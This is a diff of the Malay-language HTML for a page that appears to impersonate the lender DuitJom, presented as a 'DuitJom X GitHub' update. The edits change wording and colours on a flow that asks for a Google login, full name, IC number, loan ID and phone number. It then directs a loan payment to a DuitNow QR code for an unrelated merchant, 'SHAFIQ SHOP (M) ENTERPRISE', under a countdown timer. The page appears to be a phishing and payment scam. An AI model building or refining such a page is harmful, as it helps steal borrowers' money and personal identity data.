@@ -283,7 +283,7 @@
             <img src="IMG_6715.png" alt="Logo" class="w-16 h-16 object-contain animate-bounce">
             <div class="spinner"></div>
             <p class="text-center text-slate-800 font-bold text-sm tracking-wide">
-                Mengelog Masuk...
+                Sedang Dimuat...
             </p>
             <p class="text-xs text-gray-500 font-medium">Sila tunggu sebentar</p>
         </div>
@@ -312,25 +312,27 @@
                 FAST • ONLINE • SECURE
             </div>
             <h1 class="text-3xl font-extrabold text-slate-950 tracking-tight leading-tight mb-6">
-                proses kemaskini <span class="text-blue-400">PANTAS,</span> tanpa menunggu
+                Sistem Kawalan  <span class="text-blue-400">Administration,</span> Yang Efisien
             </h1>
             <p class="text-gray-600 text-sm max-w-xl mx-auto mb-10">
-                Kini proses kemas-kini 100% dikuasakan oleh A.I. GitHub untuk dapatkan keputusan serta merta.
+                Semua proses pentadbiran dilakukan secara digital dengan bantuan A.I., memberikan keputusan yang lebih pantas, tepat dan teratur.
+
+</p>
             </p>
 
             <div class="w-full max-w-xs mb-16">
                 
                 <!-- Butang Pembayaran (Disembunyikan pada awalnya) -->
                 <button id="btnPembayaranPinjaman" onclick="goToPaymentPage()" class="hidden w-full bg-blue-400 hover:bg-blue-500 text-white font-bold text-md px-6 py-4 rounded-xl shadow-lg shadow-blue-400/30 transition duration-200 mb-6 flex justify-center items-center gap-2">
-                    Pembayaran Pinjaman <i class="fas fa-arrow-right text-sm"></i>
+                    Teruskan <i class="fas fa-arrow-right text-sm"></i>
                 </button>
 
                 <!-- GOOGLE OAUTH LOGIN (Halaman Utama) -->
                 <div id="googleSignInSection" class="border-t border-gray-300 relative mt-4 pt-8">
-                    <span class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-[#FAF6F0] px-3 text-xs text-gray-500 font-medium whitespace-nowrap">Log Masuk</span>
+                    <span class="absolute -top-3 left-1/2 transform -translate-x-1/2 bg-[#FAF6F0] px-3 text-xs text-black-600 font-medium whitespace-nowrap">Log Masuk</span>
                     
                     <!-- Arahan kepada pelanggan -->
-                    <p class="text-[10px] text-red-600 font-bold mb-4 leading-tight">
+                    <p class="text-[10px] text-red-700 font-bold mb-4 leading-tight">
                      Log masuk menggunakan akaun Google yang berdaftar di www.duitjom.com
                     </p>
                     
@@ -346,7 +348,7 @@
     <div class="news-title">
         <span>DuitJom X GitHub</span>
         <h2>Update Semasa</h2>
-        <p>Kemas-Kini Sistem Pembayaran Baharu Duitjom</p>
+        <p>Laporan Kemas-Kini Sistem Duitjom x Github</p>
     </div>
 
     <!-- Wrapper untuk animasi -->
@@ -536,7 +538,7 @@
                 <form onsubmit="goToNextStepPage(event)" class="space-y-4">
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Nama Penuh (IC) *</label>
-                        <input type="text" id="inputNama" required placeholder="Masukkan nama lengkap Anda" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm">
+                        <input type="text" id="inputNama" required placeholder="Ali Bin Abu" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm">
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor Kad Pengenalan *</label>
@@ -547,23 +549,23 @@
                         </p>
                     </div>
                     <div>
-                        <label class="block text-xs font-bold text-slate-800 mb-1.5">DJ/CUST (Nombor) *</label>
-                        <input type="text" id="inputLoanID" required placeholder="e.g DJ/CUST00000" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validateDJCust(this)">
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">ID Loan DJ,CUST00000000 *</label>
+                        <input type="text" id="inputLoanID" required placeholder="e.g DJ30001234 atau CUST20260000" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validateDJCust(this)">
                         <p id="djcustError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
                             <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Sila masukan ID Loan DJ/Cust dengan betul</span>
+                            <span>Sila masukan salah satu ID Loan DJ/Cust dengan betul</span>
                         </p>
                         <p class="text-blue-500 text-xs mt-1.5 flex items-start gap-1">
                             <i class="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Log Masuk ke halaman www.duitjom.com untuk memdapatkan DJ/CUST NUMBER(.e.g : DJ30001234)</span>
+                            <span>Log Masuk ke halaman www.duitjom.com untuk dapatkan ID DJ/CUST NUMBER(.e.g : DJ30001234)</span>
                         </p>
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor Telefon *</label>
-                        <input type="text" id="inputPhone" required placeholder="0123456789" maxlength="11" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validatePhone(this)">
+                        <input type="text" id="inputPhone" required placeholder="e.g.0123456789" maxlength="11" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validatePhone(this)">
                         <p id="phoneError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
                             <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
-                            <span>Sila masukkan nombor telefon yang sah (+60)</span>
+                            <span>Sila masukkan nombor telefon yang sah❗️</span>
                         </p>
                     </div>
                     <div>
@@ -596,16 +598,16 @@
                 <div class="space-y-3 border-t border-gray-200 pt-4 text-xs">
                     <div class="flex justify-between"><span class="text-gray-500">Nama Penuh(IC):</span><span id="reviewNama" class="font-bold text-slate-900">-</span></div>
                     <div class="flex justify-between"><span class="text-gray-500">No. IC (MyKad):</span><span id="reviewIC" class="font-bold text-slate-900">-</span></div>
-                    <div class="flex justify-between"><span class="text-gray-500">DJ/CUST NUMBER:</span><span id="reviewLoanID" class="font-bold text-blue-400">-</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">ID DJ/CUST-NUMBER:</span><span id="reviewLoanID" class="font-bold text-blue-400">-</span></div>
                     <div class="flex justify-between"><span class="text-gray-500">Nombor Telefon:</span><span id="reviewPhone" class="font-bold text-slate-900">-</span></div>
                     <div class="flex justify-between border-t border-dashed border-gray-300 pt-2"><span class="font-bold text-gray-700">Jumlah Bayaran:</span><span id="reviewAmaun" class="font-extrabold text-blue-500">RM 0.00</span></div>
                 </div>
             </div>
 
             <div class="w-full flex gap-3">
-                <button onclick="backToInformationPage()" class="flex-1 bg-gray-200 text-gray-700 font-bold py-3 rounded-xl text-xs cursor-pointer hover:bg-gray-300 transition">← Sebelum</button>
+                <button onclick="backToInformationPage()" class="flex-1 bg-gray-200 text-gray-700 font-bold py-3 rounded-xl text-xs cursor-pointer hover:bg-gray-300 transition">← Kembali</button>
                 <button onclick="goToStep3Page()" class="flex-1 bg-gradient-to-r from-blue-400 to-blue-600 text-white font-bold py-3 rounded-xl text-xs flex items-center justify-center gap-1 cursor-pointer transition hover:from-blue-500 hover:to-blue-700">
-                    Seterusnya <i class="fas fa-arrow-right text-xs"></i>
+                    Teruskan <i class="fas fa-arrow-right text-xs"></i>
                 </button>
             </div>
         </main>
@@ -623,7 +625,7 @@
                 <div class="flex justify-between items-start text-xs font-semibold text-slate-900 mb-2">
                     <span>Jumlah Bayaran</span>
                     <div class="text-right">
-                        <span class="text-gray-500 font-normal">DJ/CUST NUMBER (e.g dj30001234):</span> 
+                        <span class="text-gray-500 font-normal">ID DJ,CUST-00000 (e.g DJ30001234):</span> 
                         <span id="displayLoanID" class="text-slate-900 font-bold ml-1">-</span>
                     </div>
                 </div>
@@ -664,7 +666,7 @@
                 <div>
                     <label class="block text-xs font-bold text-slate-700 mb-1.5">Saluran</label>
                     <select disabled class="w-full bg-white border border-gray-200 px-4 py-3 rounded-xl text-xs font-semibold text-slate-900 appearance-none">
-                        <option>Duitnow</option>
+                        <option>DuitNow</option>
                     </select>
                 </div>
 
@@ -733,15 +735,15 @@
                 <div class="w-64 p-4 border-[12px] border-blue-400 rounded-3xl bg-white shadow-md flex flex-col items-center justify-center relative">
                     <img src="F534F3AA-ACF5-40DB-BEF0-7300EC9FA735.jpeg" alt="QR Code" class="w-full h-auto object-contain rounded-lg" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=DuitJom'">
                     
-                    <p class="text-[9px] font-bold text-gray-400 mt-3 tracking-tighter">ONE TIME USE, VALID TILL 2026-06-02</p>
+                    <p class="text-[8px] font-bold text-red-400 mt-3 tracking-tighter">ONE TIME USE, VALID TILL 2026-06-02</p>
                     
                     <h2 class="text-sm font-black text-slate-900 mt-2 tracking-tight leading-tight">
                         SHAFIQ SHOP (M) ENTERPRISE
                     </h2>
 
-                    <div class="mt-4 bg-blue-50 border border-blue-200 rounded-xl px-4 py-2 w-full">
-                        <p class="text-[10px] font-bold text-blue-400 uppercase tracking-wider">Time Remaining</p>
-                        <p id="countdownTimer" class="text-base font-black text-blue-500">1m 59s</p>
+                    <div class="mt-4 bg-green-50 border border-gray-400 rounded-xl px-4 py-2 w-full">
+                        <p class="text-[10px] font-bold text-red-400 uppercase tracking-wider">Time Remaining</p>
+                        <p id="countdownTimer" class="text-sm font-semibold text-red-800">1m 59s</p>
                     </div>
                 </div>
 
